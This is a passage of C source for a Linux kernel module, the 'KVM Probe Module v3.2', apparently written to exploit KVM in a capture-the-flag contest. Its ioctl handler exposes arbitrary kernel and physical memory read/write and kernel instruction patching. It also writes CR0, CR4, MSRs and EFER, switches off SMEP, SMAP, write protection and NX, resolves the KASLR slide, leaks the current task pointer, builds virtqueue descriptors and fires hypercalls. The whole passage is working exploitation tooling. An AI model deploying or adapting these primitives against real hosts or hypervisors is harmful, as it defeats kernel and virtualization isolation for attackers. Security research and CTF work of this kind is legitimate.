            switch (p_io_data_kernel.size) {
                case 1: outb((u8)p_io_data_kernel.value, p_io_data_kernel.port); break;
                case 2: outw((u16)p_io_data_kernel.value, p_io_data_kernel.port); break;
                case 4: outl((u32)p_io_data_kernel.value, p_io_data_kernel.port); break;
            }
            force_hypercall(); /* Quiet version */
            break;

        case IOCTL_READ_MMIO: {
            struct mmio_data data;
            void __iomem *mmio;
            void *kbuf;

            if (copy_from_user(&data, (void __user *)arg, sizeof(data))) {
                return -EFAULT;
            }

            mmio = ioremap(data.phys_addr, data.size);
            if (!mmio) {
                return -EFAULT;
            }

            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mmio);
                return -ENOMEM;
            }

            memcpy_fromio(kbuf, mmio, data.size);

            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                iounmap(mmio);
                return -EFAULT;
            }

            kfree(kbuf);
            iounmap(mmio);
            force_hypercall(); /* Quiet version */
            return 0;
        }

        case IOCTL_WRITE_MMIO: {
            unsigned long map_size;

            if (copy_from_user(&m_io_data_kernel, (struct mmio_data __user *)arg, sizeof(m_io_data_kernel))) {
                return -EFAULT;
            }

            map_size = m_io_data_kernel.size > 0 ? m_io_data_kernel.size : m_io_data_kernel.value_size;
            if (map_size == 0) {
                return -EINVAL;
            }

            mapped_addr = ioremap(m_io_data_kernel.phys_addr, map_size);
            if (!mapped_addr) {
                return -ENOMEM;
            }

            if (m_io_data_kernel.size > 0) {
                if (!m_io_data_kernel.user_buffer) {
                    iounmap(mapped_addr);
                    return -EFAULT;
                }

                k_mmio_buffer = kmalloc(m_io_data_kernel.size, GFP_KERNEL);
                if (!k_mmio_buffer) {
                    iounmap(mapped_addr);
                    return -ENOMEM;
                }

                if (copy_from_user(k_mmio_buffer, m_io_data_kernel.user_buffer, m_io_data_kernel.size)) {
                    kfree(k_mmio_buffer);
                    iounmap(mapped_addr);
                    return -EFAULT;
                }

                for (len_to_copy = 0; len_to_copy < m_io_data_kernel.size; ++len_to_copy) {
                    writeb(k_mmio_buffer[len_to_copy], mapped_addr + len_to_copy);
                }

                kfree(k_mmio_buffer);
            } else {
                switch(m_io_data_kernel.value_size) {
                    case 1: writeb((u8)m_io_data_kernel.single_value, mapped_addr); break;
                    case 2: writew((u16)m_io_data_kernel.single_value, mapped_addr); break;
                    case 4: writel((u32)m_io_data_kernel.single_value, mapped_addr); break;
                    case 8: writeq(m_io_data_kernel.single_value, mapped_addr); break;
                    default:
                        iounmap(mapped_addr);
                        return -EINVAL;
                }
            }

            iounmap(mapped_addr);
            force_hypercall(); /* Quiet version */
            return 0;
        }

        case IOCTL_READ_KERNEL_MEM: {
            struct kvm_kernel_mem_read req;
            unsigned long actual_addr;

            if (copy_from_user(&req, (struct kvm_kernel_mem_read __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buf) {
                return -EINVAL;
            }

            /* Apply KASLR slide automatically */
            actual_addr = apply_kaslr_slide(req.kernel_addr);

            /* Only log if it's an interesting address or large read */
            if (req.length > 1024 || (req.kernel_addr & 0xfffff) == 0) {
                printk(KERN_DEBUG "%s: READ_KERNEL_MEM: 0x%lx -> 0x%lx (size: %lu)\n",
                       DRIVER_NAME, req.kernel_addr, actual_addr, req.length);
            }

            if (copy_to_user(req.user_buf, (void *)actual_addr, req.length)) {
                return -EFAULT;
            }

            force_hypercall(); /* Quiet version */
            break;
        }

        case IOCTL_WRITE_KERNEL_MEM: {
            struct kvm_kernel_mem_write req;
            unsigned long actual_addr;
            void *tmp;

            if (copy_from_user(&req, (struct kvm_kernel_mem_write __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buf) {
                return -EINVAL;
            }

            /* Apply KASLR slide automatically */
            actual_addr = apply_kaslr_slide(req.kernel_addr);

            /* Log all writes since they're more dangerous */
            printk(KERN_WARNING "%s: WRITE_KERNEL_MEM: 0x%lx -> 0x%lx (size: %lu)\n",
                   DRIVER_NAME, req.kernel_addr, actual_addr, req.length);

            tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp) {
                return -ENOMEM;
            }

            if (copy_from_user(tmp, req.user_buf, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }

            memcpy((void *)actual_addr, tmp, req.length);
            kfree(tmp);
            force_hypercall(); /* Quiet version */
            break;
        }

        case IOCTL_ALLOC_VQ_PAGE: {
            struct page *vq_page_ptr;
            unsigned long pfn_to_user;

            if (g_vq_virt_addr) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
            }

            vq_page_ptr = alloc_pages(GFP_KERNEL | __GFP_ZERO, VQ_PAGE_ORDER);
            if (!vq_page_ptr) {
                return -ENOMEM;
            }

            g_vq_virt_addr = page_address(vq_page_ptr);
            g_vq_phys_addr = page_to_phys(vq_page_ptr);
            g_vq_pfn = PFN_DOWN(g_vq_phys_addr);
            pfn_to_user = g_vq_pfn;

            if (copy_to_user((unsigned long __user *)arg, &pfn_to_user, sizeof(pfn_to_user))) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
                return -EFAULT;
            }

            force_hypercall(); /* Quiet version */
            break;
        }

        case IOCTL_FREE_VQ_PAGE: {
            if (g_vq_virt_addr) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
            }
            force_hypercall(); /* Quiet version */
            break;
        }

        case IOCTL_WRITE_VQ_DESC: {
            struct vq_desc_user_data user_desc_data_kernel;
            struct vring_desc_kernel *kernel_desc_ptr_local;
            unsigned int max_descs_in_page_local;

            if (!g_vq_virt_addr) {
                return -ENXIO;
            }

            if (copy_from_user(&user_desc_data_kernel, (struct vq_desc_user_data __user *)arg, sizeof(user_desc_data_kernel))) {
                return -EFAULT;
            }

            max_descs_in_page_local = VQ_PAGE_SIZE / sizeof(struct vring_desc_kernel);
            if (user_desc_data_kernel.index >= max_descs_in_page_local) {
                return -EINVAL;
            }

            kernel_desc_ptr_local = (struct vring_desc_kernel *)g_vq_virt_addr + user_desc_data_kernel.index;
            kernel_desc_ptr_local->addr = cpu_to_le64(user_desc_data_kernel.phys_addr);
            kernel_desc_ptr_local->len = cpu_to_le32(user_desc_data_kernel.len);
            kernel_desc_ptr_local->flags = cpu_to_le16(user_desc_data_kernel.flags);
            kernel_desc_ptr_local->next = cpu_to_le16(user_desc_data_kernel.next_idx);

            force_hypercall(); /* Quiet version */
            break;
        }

        case IOCTL_TRIGGER_HYPERCALL: {
            long ret = force_hypercall();

            if (copy_to_user((long __user *)arg, &ret, sizeof(ret))) {
                return -EFAULT;
            }
            break;
        }

        case IOCTL_SCAN_VA: {
            struct va_scan_data va_req;
            void *src;
            unsigned char *tmp;
            unsigned long actual_addr;

            if (copy_from_user(&va_req, (struct va_scan_data __user *)arg, sizeof(va_req))) {
                return -EFAULT;
            }

            if (!va_req.va || !va_req.size || !va_req.user_buffer) {
                return -EINVAL;
            }

            /* Apply KASLR slide automatically */
            actual_addr = apply_kaslr_slide(va_req.va);

            src = (void *)actual_addr;
            tmp = kmalloc(va_req.size, GFP_KERNEL);
            if (!tmp) {
                return -ENOMEM;
            }

            memcpy(tmp, src, va_req.size);

            if (copy_to_user(va_req.user_buffer, tmp, va_req.size)) {
                kfree(tmp);
                return -EFAULT;
            }

            kfree(tmp);
            force_hypercall(); /* Quiet version */
            return 0;
        }

        case IOCTL_WRITE_VA: {
            struct va_write_data wa_req;
            unsigned long actual_addr;
            unsigned char *tmp;

            if (copy_from_user(&wa_req, (struct va_write_data __user *)arg, sizeof(wa_req))) {
                return -EFAULT;
            }

            if (!wa_req.va || !wa_req.size || !wa_req.user_buffer) {
                return -EINVAL;
            }

            /* Apply KASLR slide automatically */
            actual_addr = apply_kaslr_slide(wa_req.va);

            tmp = kmalloc(wa_req.size, GFP_KERNEL);
            if (!tmp) {
                return -ENOMEM;
            }

            if (copy_from_user(tmp, wa_req.user_buffer, wa_req.size)) {
                kfree(tmp);
                return -EFAULT;
            }

            memcpy((void *)actual_addr, tmp, wa_req.size);
            kfree(tmp);
            force_hypercall(); /* Quiet version */
            return 0;
        }
            case IOCTL_GET_CURRENT_TASK: {
                unsigned long current_task = (unsigned long)current;
                return copy_to_user((void __user *)arg, &current_task, sizeof(current_task)) ? -EFAULT : 0;
            }

        case IOCTL_HYPERCALL_ARGS: {
            struct hypercall_args args;
            long ret;

            if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
                return -EFAULT;
            }

            ret = do_hypercall(&args);

            if (copy_to_user((void __user *)arg, &ret, sizeof(ret))) {
                return -EFAULT;
            }
            break;
        }

        /* ========================================================================
         * FIXED VIRT_TO_PHYS IMPLEMENTATION
         * ======================================================================== */
        case IOCTL_VIRT_TO_PHYS: {
            unsigned long va, pa = 0;

            if (copy_from_user(&va, (void __user *)arg, sizeof(va))) {
                return -EFAULT;
            }

            if (!va) {
                return -EINVAL;
            }

            /* Only handle kernel addresses */
            if (is_kernel_address(va)) {
                pa = virt_to_phys((void *)va);
                printk(KERN_DEBUG "%s: VIRT_TO_PHYS: 0x%lx -> 0x%lx\n",
                    DRIVER_NAME, va, pa);
                return copy_to_user((void __user *)arg, &pa, sizeof(pa)) ? -EFAULT : 0;
            } else {
                printk(KERN_WARNING "%s: VIRT_TO_PHYS only supports kernel addresses: 0x%lx\n",
                    DRIVER_NAME, va);
                return -EINVAL;
            }
        }

        case IOCTL_WRITE_FLAG_ADDR: {
            unsigned long val;
            unsigned long actual_addr;

            if (g_symbol_write_flag) {
                if (copy_from_user(&val, (void __user *)arg, sizeof(val))) {
                    return -EFAULT;
                }

                /* Use cached symbol address */
                actual_addr = g_symbol_write_flag;
                *((unsigned long *)actual_addr) = val;
                printk(KERN_DEBUG "%s: WRITE_FLAG_ADDR: wrote 0x%lx to 0x%lx\n",
                       DRIVER_NAME, val, actual_addr);
                return 0;
            } else {
                return -ENOENT;
            }
        }

        case IOCTL_READ_FLAG_ADDR: {
            if (g_symbol_write_flag) {
                unsigned long val = *((unsigned long *)g_symbol_write_flag);
                return copy_to_user((void __user *)arg, &val, sizeof(val)) ? -EFAULT : 0;
            } else {
                return -ENOENT;
            }
        }

        case IOCTL_PATCH_INSTRUCTIONS: {
            struct patch_req req;
            unsigned char *kbuf;
            unsigned long actual_addr;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.dst_va || !req.size || !req.user_buf || req.size > PAGE_SIZE) {
                return -EINVAL;
            }

            /* Apply KASLR slide automatically */
            actual_addr = apply_kaslr_slide(req.dst_va);
            printk(KERN_WARNING "%s: PATCH: 0x%lx -> 0x%lx (size: %lu)\n",
                   DRIVER_NAME, req.dst_va, actual_addr, req.size);

            kbuf = kmalloc(req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buf, req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            /* Direct memcpy without memory protection changes */
            memcpy((void *)actual_addr, kbuf, req.size);

            kfree(kbuf);
            return 0;
        }

        /* ========================================================================
         * KVMCTF Extreme Exploitation Primitives - FIXED VERSION
         * ======================================================================== */
        case IOCTL_DISABLE_SMEP:
            disable_smep();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_ENABLE_SMEP:
            enable_smep();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_DISABLE_SMAP:
            disable_smap();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_ENABLE_SMAP:
            enable_smap();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_DISABLE_WP:
            disable_wp();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_ENABLE_WP:
            enable_wp();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_READ_CR4: {
#ifdef CONFIG_X86
            unsigned long cr4 = my_read_cr4();
            return copy_to_user((void __user *)arg, &cr4, sizeof(cr4)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_CR4: {
#ifdef CONFIG_X86
            unsigned long cr4;
            if (copy_from_user(&cr4, (void __user *)arg, sizeof(cr4))) {
                return -EFAULT;
            }
            /* Log CR4 writes since they're security critical */
            printk(KERN_WARNING "%s: CR4 WRITE: 0x%lx\n", DRIVER_NAME, cr4);
            my_write_cr4(cr4);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_CR0: {
#ifdef CONFIG_X86
            unsigned long cr0 = my_read_cr0();
            return copy_to_user((void __user *)arg, &cr0, sizeof(cr0)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_CR0: {
#ifdef CONFIG_X86
            unsigned long cr0;
            if (copy_from_user(&cr0, (void __user *)arg, sizeof(cr0))) {
                return -EFAULT;
            }
            /* Log CR0 writes since they're security critical */
            printk(KERN_WARNING "%s: CR0 WRITE: 0x%lx\n", DRIVER_NAME, cr0);
            my_write_cr0(cr0);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_MSR: {
#ifdef CONFIG_X86
            struct msr_data msr_req;
            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
                return -EFAULT;
            }
            msr_req.value = my_rdmsr(msr_req.msr);
            return copy_to_user((void __user *)arg, &msr_req, sizeof(msr_req)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_MSR: {
#ifdef CONFIG_X86
            struct msr_data msr_req;
            if (copy_from_user(&msr_req, (void __user *)arg, sizeof(msr_req))) {
                return -EFAULT;
            }
            /* Log MSR writes since they're very dangerous */
            printk(KERN_WARNING "%s: MSR WRITE: 0x%x = 0x%llx\n",
                   DRIVER_NAME, msr_req.msr, msr_req.value);
            my_wrmsr(msr_req.msr, msr_req.value);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_READ_PHYSICAL: {
            struct physical_rw phys_req;
            unsigned char *kbuf;

            if (copy_from_user(&phys_req, (void __user *)arg, sizeof(phys_req))) {
                return -EFAULT;
            }

            if (!phys_req.phys_addr || !phys_req.size || !phys_req.user_buffer) {
                return -EINVAL;
            }

            kbuf = kmalloc(phys_req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (read_physical_memory(phys_req.phys_addr, kbuf, phys_req.size) < 0) {
                kfree(kbuf);
                return -EFAULT;
            }

            if (copy_to_user(phys_req.user_buffer, kbuf, phys_req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            kfree(kbuf);
            return 0;
        }

        case IOCTL_WRITE_PHYSICAL: {
            struct physical_rw phys_req;
            unsigned char *kbuf;

            if (copy_from_user(&phys_req, (void __user *)arg, sizeof(phys_req))) {
                return -EFAULT;
            }

            if (!phys_req.phys_addr || !phys_req.size || !phys_req.user_buffer) {
                return -EINVAL;
            }

            /* Log physical memory writes - very dangerous! */
            printk(KERN_WARNING "%s: WRITE_PHYSICAL: 0x%lx (size: %lu)\n",
                   DRIVER_NAME, phys_req.phys_addr, phys_req.size);

            kbuf = kmalloc(phys_req.size, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, phys_req.user_buffer, phys_req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            if (write_physical_memory(phys_req.phys_addr, kbuf, phys_req.size) < 0) {
                kfree(kbuf);
                return -EFAULT;
            }

            kfree(kbuf);
            return 0;
        }

        case IOCTL_ALLOC_ROOT_PAGES: {
            unsigned long __user *user_pages = (unsigned long __user *)arg;
            int count = 8; /* Default count */
            return alloc_root_pages(user_pages, count);
        }

        /* ========================================================================
         * NX Bit Control
         * ======================================================================== */
        case IOCTL_ENABLE_NX:
            enable_nx();
            check_protection_status();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_DISABLE_NX:
            disable_nx();
            check_protection_status();
            force_hypercall(); /* Quiet version */
            return 0;

        case IOCTL_READ_EFER: {
#ifdef CONFIG_X86
            u64 efer = my_rdmsr(MSR_EFER);
            return copy_to_user((void __user *)arg, &efer, sizeof(efer)) ? -EFAULT : 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_EFER: {
#ifdef CONFIG_X86
            u64 efer;
            if (copy_from_user(&efer, (void __user *)arg, sizeof(efer))) {
                return -EFAULT;
            }
            /* Log EFER writes since they're very dangerous */
            printk(KERN_WARNING "%s: EFER WRITE: 0x%llx\n", DRIVER_NAME, efer);
            my_wrmsr(MSR_EFER, efer);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_CHECK_STATUS:
            check_protection_status();
            return 0;

        default:
            printk(KERN_ERR "%s: Unknown IOCTL command: 0x%x\n", DRIVER_NAME, cmd);
            return -EINVAL;
    }

    return 0;
}

/* ========================================================================
 * File Operations
 * ======================================================================== */

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = driver_ioctl,
};

/* ========================================================================
 * Module Init/Exit
 * ======================================================================== */

static int __init mod_init(void) {
    int ret;

    printk(KERN_INFO "%s: Initializing KVM Probe Module v3.2\n", DRIVER_NAME);

    /* Initialize protection tracking variables */
    g_original_cr4 = 0;
    g_original_cr0 = 0;
    g_original_efer = 0;
    g_smep_disabled = false;
    g_smap_disabled = false;
    g_wp_disabled = false;
    g_nx_enabled = false;

#if HAS_SET_MEMORY_FUNCS
    printk(KERN_INFO "%s: Using native set_memory functions\n", DRIVER_NAME);
#else
    printk(KERN_INFO "%s: Using fallback page table manipulation\n", DRIVER_NAME);
#endif

    /* Initialize kallsyms lookup for modern kernels */
    ret = kallsyms_lookup_init();
    if (ret < 0) {
        printk(KERN_WARNING "%s: kallsyms_lookup initialization failed, some features may not work\n", DRIVER_NAME);
    }

    /* Initialize KASLR slide detection */
    ret = init_kaslr_slide();
    if (ret < 0) {
        printk(KERN_WARNING "%s: KASLR slide detection failed, some features may not work correctly\n", DRIVER_NAME);
    }

    /* Cache important kernel symbols */
    ret = cache_important_symbols();
    if (ret < 0) {
        printk(KERN_WARNING "%s: Failed to cache some kernel symbols\n", DRIVER_NAME);
    }

    /* Register character device */
    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) {
        printk(KERN_ERR "%s: register_chrdev failed: %d\n", DRIVER_NAME, major_num);
        return major_num;
    }

    /* Create device class */
    driver_class = CLASS_CREATE_COMPAT(DRIVER_NAME);
    if (IS_ERR(driver_class)) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: class_create failed\n", DRIVER_NAME);
        return PTR_ERR(driver_class);
    }

    /* Create device */
    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) {
        class_destroy(driver_class);
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
        printk(KERN_ERR "%s: device_create failed\n", DRIVER_NAME);
        return PTR_ERR(driver_device);
    }

    /* Initialize global state */
    g_vq_virt_addr = NULL;
    g_vq_phys_addr = 0;
    g_vq_pfn = 0;

    printk(KERN_INFO "%s: Module loaded. Device /dev/%s created with major %d\n",
           DRIVER_NAME, DEVICE_FILE_NAME, major_num);
    printk(KERN_INFO "%s: KASLR slide: 0x%lx, Kernel base: 0x%lx\n",
           DRIVER_NAME, g_kaslr_slide, g_kernel_base);

    return 0;
}

static void __exit mod_exit(void) {
    printk(KERN_INFO "%s: Unloading KVM Probe Module\n", DRIVER_NAME);

    /* Restore any disabled protections */
    restore_protections();

    /* Free VQ page if allocated */
    if (g_vq_virt_addr) {
        printk(KERN_INFO "%s: Freeing VQ page (virt: %p, phys: 0x%llx)\n",
               DRIVER_NAME, g_vq_virt_addr, (unsigned long long)g_vq_phys_addr);
        free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
        g_vq_virt_addr = NULL;
        g_vq_phys_addr = 0;
        g_vq_pfn = 0;
    }

    /* Destroy device */
    if (driver_device) {
        device_destroy(driver_class, MKDEV(major_num, 0));
    }

    /* Destroy class */
    if (driver_class) {
        class_destroy(driver_class);
    }

    /* Unregister character device */
    if (major_num >= 0) {
        unregister_chrdev(major_num, DEVICE_FILE_NAME);
    }

    printk(KERN_INFO "%s: Module unloaded\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit)